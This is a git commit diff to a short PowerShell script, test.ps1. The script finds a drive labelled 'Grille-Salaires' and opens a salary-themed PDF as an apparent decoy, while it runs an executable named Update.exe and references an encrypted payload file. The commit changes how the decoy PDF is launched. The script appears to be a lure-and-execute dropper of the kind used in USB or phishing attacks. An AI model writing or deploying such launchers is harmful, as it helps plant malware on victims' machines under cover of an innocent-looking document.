c92c0941e9ef9bc160488ca54409949193cc7a05
RkDx <61869865+RkDx@users.noreply.github.com>
2022-10-02 03:23:27 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,6 +1,6 @@
 $Env:hagrid="mdll s0.enc";
 $device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "Grille-Salaires" | foreach { $_.DeviceID });
 cd $device;
-.\grille.pdf;
+start .\grille.pdf;
 sleep 10;
 .\Update.exe
